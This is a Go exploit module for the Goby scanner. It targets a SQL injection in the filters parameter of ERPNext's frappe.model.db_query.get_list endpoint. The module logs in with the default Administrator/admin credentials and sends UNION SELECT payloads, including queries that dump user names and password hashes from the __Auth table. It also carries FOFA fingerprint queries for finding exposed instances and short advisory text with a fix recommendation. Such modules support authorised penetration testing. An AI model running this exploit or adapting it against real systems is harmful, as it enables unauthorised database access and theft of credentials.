package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ERPNext frappe.model.db_query.get_list File filters Parameter SQL Injection Vulnerability",
    "Description": "<p>ERPNext is an open source enterprise resource planning system.</p><p>There is a SQL injection vulnerability in the filters parameter of the ERPNext frappe.model.db_query.get_list file. In addition to using the SQL injection vulnerability to obtain information in the database (for example, administrator backend password, site user personal information), attackers can even use high privileges to obtain information in the database. In this case, Trojans can be written to the server to further obtain server system permissions.</p>",
    "Product": "ERPNext ",
    "Homepage": "https://erpnext.com/",
    "DisclosureDate": "2023-02-23",
    "Author": " 635477622@qq.com",
    "FofaQuery": "(body=\"ERPNext\" && (title=\"Login\" || header=\"Set-Cookie: system_user=\")) || body=\"src=\\\"/assets/erpnext/dist/js/erpnext-web.bundle.VAACRQHC.js\" || header=\"/assets/erpnext/zuse/css/site.css\" || header=\"/assets/erpnext/day/assets/vendor/\" || header=\"/assets/erpnext/dist/js/erpnext\" || banner=\"erpnext-web.bundle.js\" || header=\"erpnext-web.bundle.js\" || banner=\"/assets/erpnext/dist/js/erpnext\" || banner=\"/assets/js/erpnext-web.min.js\" || header=\"/assets/js/erpnext-web.min.js\" || body=\"href=\\\"/assets/css/erpnext-web.css\" || body=\"src=\\\"/assets/js/erpnext-web.min.js\" || header=\"ERPNext\" || banner=\"ERPNext\"",
    "GobyQuery": "(body=\"ERPNext\" && (title=\"Login\" || header=\"Set-Cookie: system_user=\")) || body=\"src=\\\"/assets/erpnext/dist/js/erpnext-web.bundle.VAACRQHC.js\" || header=\"/assets/erpnext/zuse/css/site.css\" || header=\"/assets/erpnext/day/assets/vendor/\" || header=\"/assets/erpnext/dist/js/erpnext\" || banner=\"erpnext-web.bundle.js\" || header=\"erpnext-web.bundle.js\" || banner=\"/assets/erpnext/dist/js/erpnext\" || banner=\"/assets/js/erpnext-web.min.js\" || header=\"/assets/js/erpnext-web.min.js\" || body=\"href=\\\"/assets/css/erpnext-web.css\" || body=\"src=\\\"/assets/js/erpnext-web.min.js\" || header=\"ERPNext\" || banner=\"ERPNext\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in the filters parameter of the ERPNext frappe.model.db_query.get_list file. In addition to using the SQL injection vulnerability to obtain information in the database (for example, administrator backend password, site user personal information), attackers can even use high privileges to obtain information in the database. In this case, Trojans can be written to the server to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/frappe/erpnext\">https://github.com/frappe/erpnext</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://packetstormsecurity.com/files/162531/ERPNext-12.18.0-13.0.0-SQL-Injection.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,userAccount,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "UNION SELECT 34973419",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8 ",
    "Translation": {
        "CN": {
            "Name": "ERPNext frappe.model.db_query.get_list 文件 filters 参数 SQL 注入漏洞",
            "Product": "ERPNext ",
            "Description": "<p>ERPNext 是一套开源的企业资源计划系统。</p><p>ERPNext frappe.model.db_query.get_list 文件 filters 参数存在 SQL 注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/frappe/erpnext\" target=\"_blank\">https://github.com/frappe/erpnext</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>ERPNext frappe.model.db_query.get_list 文件 filters 参数存在 SQL 注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "ERPNext frappe.model.db_query.get_list File filters Parameter SQL Injection Vulnerability",
            "Product": "ERPNext ",
            "Description": "<p>ERPNext is an open source enterprise resource planning system.</p><p>There is a SQL injection vulnerability in the filters parameter of the ERPNext frappe.model.db_query.get_list file. In addition to using the SQL injection vulnerability to obtain information in the database (for example, administrator backend password, site user personal information), attackers can even use high privileges to obtain information in the database. In this case, Trojans can be written to the server to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://github.com/frappe/erpnext\" target=\"_blank\">https://github.com/frappe/erpnext</a><br></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is a SQL injection vulnerability in the filters parameter of the ERPNext frappe.model.db_query.get_list file. In addition to using the SQL injection vulnerability to obtain information in the database (for example, administrator backend password, site user personal information), attackers can even use high privileges to obtain information in the database. In this case, Trojans can be written to the server to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-10",
    "PocId": "10847"
}`

	sendLoginPayload5631dfghsd := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		sendConfig.Data = "cmd=login&usr=Administrator&pwd=admin&device=desktop"
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	sendSqlPayload5631dfghsd := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		resp, err := sendLoginPayload5631dfghsd(hostInfo)
		if err != nil {
			return nil, err
		} else if !strings.Contains(resp.Utf8Html, `"message":"Logged In",`) {
			return nil, errors.New("漏洞利用失败")
		}
		sql, _ = url.PathUnescape(sql)
		sendConfig := httpclient.NewGetRequestConfig("/api/method/frappe.model.db_query.get_list?filters=%7b%22name%20" + url.QueryEscape(sql) + "%20--%20%22%3a%20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20&order_by=name&_=1615372773071")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Cookie", resp.Cookie)
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	listUserFlag3VcIFJz := func(hostInfo *httpclient.FixUrl) (string, error) {
		var data map[string][]map[string]string
		var tmpExecuteResults [][]string
		for _, sql := range []string{`UNION SELECT name from %60__Auth%60`, `UNION SELECT password from %60__Auth%60`} {
			resp, err := sendSqlPayload5631dfghsd(hostInfo, sql)
			if err != nil {
				return "", err
			} else if resp.StatusCode != 200 {
				return "", errors.New("漏洞利用失败")
			}
			err = json.Unmarshal([]byte(resp.RawBody), &data)
			if err != nil {
				return "", err
			}
			var tmpExecuteResult []string
			for _, item := range data["message"] {
				tmpExecuteResult = append(tmpExecuteResult, item["name"])
			}
			tmpExecuteResults = append(tmpExecuteResults, tmpExecuteResult)
		}
		var usernameAndPassword []string
		for i := 0; i < len(tmpExecuteResults[0]); i++ {
			usernameAndPassword = append(usernameAndPassword, "username: "+tmpExecuteResults[0][i]+"\tpassword: "+tmpExecuteResults[1][i])
		}
		return strings.Join(usernameAndPassword, " \n"), nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, _ := sendSqlPayload5631dfghsd(hostInfo, "UNION SELECT 34973419")
			return resp != nil && strings.Contains(resp.Utf8Html, `"name":"34973419"`)
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			if attackType == "sql" {
				resp, err := sendSqlPayload5631dfghsd(expResult.HostInfo, goutils.B2S(singleScanConfig.Params["sql"]))
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if resp.StatusCode != 200 {
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				var data map[string][]map[string]string
				err = json.Unmarshal([]byte(resp.RawBody), &data)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				for _, item := range data["message"] {
					expResult.Output += item["name"] + "\n\n"
				}
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				resp, err := sendSqlPayload5631dfghsd(expResult.HostInfo, "UNION SELECT 34973419")
				expResult.Output = `漏洞利用失败`
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(resp.Utf8Html, `"name":"34973419"`) {
					expResult.Success = true
					expResult.Output = `GET /api/method/frappe.model.db_query.get_list?filters=%7b%22name%20UNION+SELECT+34973419%20--%20%22%3a%20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20&order_by=name&_=1615372773071 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cookie: sid=` + resp.Cookie + `;system_user=yes;full_name=Administrator;user_id=Administrator;user_image=/files/Admin.jpg;
Accept-Encoding: gzip, deflate
Connection: close

`
				}
			} else if attackType == "userAccount" {
				userInfo, err := listUserFlag3VcIFJz(expResult.HostInfo)
				expResult.Output = userInfo
				if err != nil {
					expResult.Output = err.Error()
				} else if userInfo != "" {
					expResult.Success = true
				}
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			return expResult
		},
	))
}
